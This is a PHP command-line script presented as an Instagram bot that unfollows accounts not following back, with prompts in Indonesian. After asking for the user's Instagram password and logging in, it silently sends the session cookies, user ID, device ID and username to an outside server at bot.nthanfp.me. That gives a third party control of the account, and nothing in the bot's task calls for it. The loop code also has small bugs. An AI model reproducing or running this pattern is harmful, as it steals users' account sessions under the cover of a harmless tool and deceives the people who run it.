<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "[?] Input your instagram username : ";
$userig    = trim(fgets(STDIN, 1024));
echo "[?] Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "".$green."[+] Login Success....".$normal."\n";
    echo "".$green."[+] Please Wait".$normal."\n";
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig  = req('https://bot.nthanfp.me/action/api().php', $data);
    echo "[?] Input delay : ";
    $delay  = trim(fgets(STDIN, 1024));
    //start
        do{
            $parameters = ($c>0) ? '?max_id='.$c : '';
            $req = proccess(1, $useragent, 'friendships/'.$uid.'/following/'.$parameters, $cookie);
            $req = json_decode($req[1]);
            if(!$req)
                die("Connection error");
            for($i=0;$i<count($req->users);$i++):
                $date         = date("Y-m-d H:i:s");
                $status       = proccess(1, $useragent, 'friendships/show/'.$req->users[$i]->pk.'/', $cookie);
                $statusx      = json_decode($status[1], true);
                $gafoll       = $statusx['followed_by'];
                $usernamenye  = $req->users[$i]->username;
                if($gafoll==1){
                    echo "".$blue."[x][".$i."] ".$date." | @".$usernamenye." Saling Follow".$normal."\n";
                }else{
                    $unfollow = proccess(1, $useragent, 'friendships/destroy/'.$req->users[$i]->pk.'/', $cookie, hook('{"user_id":"'.$req->users[$i]->pk.'"}'));
                    $unfollow = json_decode($unfollow[1]);
                    if($unfollow->status == 'ok'):
                        $unfollow_status = ''.$grenn.'Success'.$normal.'';
                    else:
                        $unfollow_status = ''.$red.'Failed'.$normal.'';
                    endif;    
                    echo "[+][".$i."] ".$date." | @".$usernamenye." Tidak Saling Follow | ".$unfollow_status." Unfollow]\n";
                }
                sleep($delay);
            endfor;
        } while($c>0);
}
?>
